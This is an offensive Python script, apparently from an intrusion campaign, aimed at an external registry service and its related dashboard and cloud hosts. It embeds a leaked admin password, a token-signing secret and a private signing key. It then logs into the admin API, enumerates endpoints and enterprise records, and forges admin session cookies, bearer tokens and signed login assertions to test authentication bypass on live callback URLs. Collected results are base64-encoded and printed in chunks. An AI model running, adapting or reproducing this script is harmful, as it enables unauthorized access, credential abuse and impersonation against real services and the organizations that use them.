#!/usr/bin/env python3
# i29469 round c: EXTERNAL registry.lumiiai.cn admin (password works) enumeration + forged admin cookie + forged instance token + LOGIN_ASSERTION centre test.
import os, json, time, base64, hmac, hashlib, subprocess
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
REG = "https://registry.lumiiai.cn"
REG_PW = "PIf8jOhp275N9N4CYvkBMQtGRQ3RWMOP"
REG_TOKEN = "9d275d97606940a90c37f2b1ab8caaa21c43075f5019f6d21cef08c0d625f4ce"
KID = "k20261009"
LDER = "MC4CAQAwBQYDK2VwBCIEIG+cRuu/fyxmdqhgWcOIkoDK2bEe7E1mr+fBXr1lAM1g"
CJ = "/tmp/i29469c_cj.txt"
START = time.time()

def _b(s):
    if not isinstance(s, str): s = json.dumps(s, ensure_ascii=False, default=str)
    return base64.b64encode(s.encode("utf-8", "replace")).decode()
def R(k, v): print("R:%s:%s" % (k, _b(v)), flush=True)
def Rc(k, text, chunk=2500):
    text = text if isinstance(text, str) else str(text)
    n = (len(text)+chunk-1)//chunk; R(k+"_N", str(n))
    for i in range(n): R("%s_%d" % (k, i), text[i*chunk:(i+1)*chunk])
def run(a, timeout=60):
    try:
        p = subprocess.run(a, capture_output=True, timeout=timeout); return p.returncode, p.stdout, p.stderr
    except Exception as e: return -1, b"", repr(e).encode()
def http(url, method="GET", body=None, headers=None, timeout=16, jar=None, maxlen=200000):
    a = ["curl","-s","-k","-m",str(timeout),"--http2","-A",UA,"-w","\n__C__%{http_code}"]
    if jar: a += ["-b", jar, "-c", jar]
    for h in (headers or []): a += ["-H", h]
    if body is not None: a += ["-X", method, "--data-binary", body]
    elif method != "GET": a += ["-X", method]
    a += [url]
    rc, out, err = run(a, timeout=timeout+15)
    t = out.decode("utf-8","replace"); c=""
    i=t.rfind("__C__")
    if i>=0: c=t[i+5:].strip()[:3]; t=t[:i]
    return {"code":c,"body":t[:maxlen]}
def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b'=').decode()

res = {}
# 1) login capturing cookie jar
open(CJ,"w").close()
lr = http(REG+"/admin/api/login", "POST", json.dumps({"password":REG_PW}),
          ["Content-Type: application/json","Origin: https://registry.lumiiai.cn"], jar=CJ)
res["login"] = {"code":lr["code"],"body":lr["body"][:200]}
try:
    jar = open(CJ).read()
    res["cookie_jar"] = jar
except Exception as e:
    res["cookie_jar"] = repr(e)
# extract cookie name/value
cname=cval=None
for line in (res.get("cookie_jar") or "").splitlines():
    if line and not line.startswith("#") and "\t" in line:
        parts=line.split("\t")
        if len(parts)>=7:
            cname=parts[5]; cval=parts[6]
res["cookie_name"] = cname
R("LOGIN_COOKIE", res)

# 2) enumerate admin API endpoints (GET)
endpoints = ["/admin/api/enterprises","/admin/api/onboard-tokens","/admin/api/onboard-token",
             "/admin/api/audit","/admin/api/audit-log","/admin/api/health","/admin/api/me",
             "/admin/api/market","/admin/api/market/publishers","/admin/api/market/agents",
             "/admin/api/instances","/admin/api/cloud-environments","/admin/api/enterprise-ops",
             "/admin/api/version","/admin/api/stats"]
en = {}
for ep in endpoints:
    rr = http(REG+ep, jar=CJ, timeout=14, maxlen=40000)
    en[ep] = {"code":rr["code"],"body":rr["body"][:1500]}
Rc("ENUM", json.dumps(en, ensure_ascii=False), chunk=2200)

# 3) detail per enterprise code (parse list first)
ents=[]
try:
    lst = json.loads(en.get("/admin/api/enterprises",{}).get("body") or "{}")
    ents = lst.get("enterprises") or lst.get("items") or (lst if isinstance(lst,list) else [])
except Exception as e:
    ents=[]
codes=[e.get("code") for e in ents if isinstance(e,dict) and e.get("code")]
R("ENT_CODES", codes)
det={}
for code in codes[:20]:
    rr = http(REG+"/admin/api/enterprises/"+code, jar=CJ, timeout=12, maxlen=20000)
    det[code]={"code":rr["code"],"body":rr["body"][:2000]}
Rc("ENT_DETAIL", json.dumps(det, ensure_ascii=False), chunk=2200)

# 4) forge admin cookie (scrypt) and test
try:
    k=hashlib.scrypt(REG_PW.encode(), salt=b"lumii-registry-admin-session\x00v1", n=16384,r=8,p=1,dklen=32)
    exp=int(time.time())+6*3600
    pl=b64u(json.dumps({"exp":exp},separators=(",",":")))
    sg=b64u(hmac.new(k,pl.encode(),hashlib.sha256).digest())
    forged=pl+"."+sg
    name=cname or "lumii_registry_admin"
    ft = http(REG+"/admin/api/enterprises","GET",headers=["Cookie: %s=%s"%(name,forged)],timeout=14,maxlen=2000)
    R("FORGED_COOKIE_TEST", {"name":name,"token":forged,"code":ft["code"],"body":ft["body"][:300]})
except Exception as e:
    R("FORGED_COOKIE_ERR", repr(e))

# 5) forge instance token (REGISTRY_TOKEN_SECRET) and test on external /v1/market/publisher
try:
    code = codes[0] if codes else "aro"
    # need eid; try detail
    eid=""
    if code in det:
        try:
            dj=json.loads(det[code]["body"]); eid=(dj.get("enterprise") or {}).get("id") or dj.get("id") or ""
        except Exception: eid=""
    payload={"eid":eid,"code":code,"scope":"market","exp":int(time.time())+3600,"n":"abc123"}
    enc=b64u(json.dumps(payload,separators=(",",":")))
    sg=b64u(hmac.new(REG_TOKEN.encode(),("v1."+enc).encode(),hashlib.sha256).digest())
    tok="v1."+enc+"."+sg
    it=http(REG+"/v1/market/publisher","GET",headers=["Authorization: Bearer "+tok],timeout=12,maxlen=3000)
    it2=http(REG+"/v1/market/agents?token="+tok,"GET",timeout=12,maxlen=1500)
    R("INSTANCE_TOKEN", {"code":code,"eid":eid,"publisher":it,"agents":it2,"tokhead":tok[:50]})
except Exception as e:
    R("INSTANCE_TOKEN_ERR", repr(e))

# 6) LOGIN_ASSERTION forge + centre callback test
try:
    open("/tmp/i29469c.der","wb").write(base64.b64decode(LDER))
    run(["openssl","pkey","-inform","DER","-in","/tmp/i29469c.der","-out","/tmp/i29469c.pem"], timeout=20)
    def mkassert(aud, sub, state, app="web", flowpath="/api/auth/wechat/callback"):
        iat=int(time.time())
        hdr={"alg":"EdDSA","typ":"JWT","kid":KID}
        pl={"iss":"lumii-registry","sub":sub,"aud":aud,"state":state,"nick":"x","avatar":"","app":app,"jti":"j"+str(iat),"iat":iat,"exp":iat+120}
        inp=b64u(json.dumps(hdr,separators=(",",":")))+"."+b64u(json.dumps(pl,separators=(",",":")))
        p=subprocess.run(["openssl","pkeyutl","-sign","-inkey","/tmp/i29469c.pem","-rawin"],input=inp.encode(),capture_output=True,timeout=20)
        return inp+"."+b64u(p.stdout), p.returncode, p.stderr.decode("utf-8","replace")[:200]
    # auds: from enterprise base_urls
    auds=[]
    for e in ents:
        if isinstance(e,dict) and e.get("base_url"): auds.append((e.get("base_url"),"/api/auth/wechat/callback","web"))
    auds += [("https://dashboard.lumiiai.cn","/api/auth/wechat/callback","web"),
             ("https://cloud.lumiiai.cn","/v1/entry/wechat/callback","cloud")]
    tests={}
    for aud, path, app in auds[:8]:
        asrt, rc, er = mkassert(aud, "testunionid_zz", "st"+str(int(time.time())))
        url = aud.rstrip("/")+path+"?"+"state=st1&assertion="+asrt
        rr = http(url, timeout=14, maxlen=2000)
        tests[aud+path] = {"sign_rc":rc,"sign_err":er[:80],"code":rr["code"],"body":rr["body"][:300]}
    Rc("ASSERT_TESTS", json.dumps(tests, ensure_ascii=False), chunk=2200)
except Exception as e:
    R("ASSERT_ERR", repr(e))

R("P_DONE", {"elapsed": int(time.time()-START)})
print("DONE", flush=True)
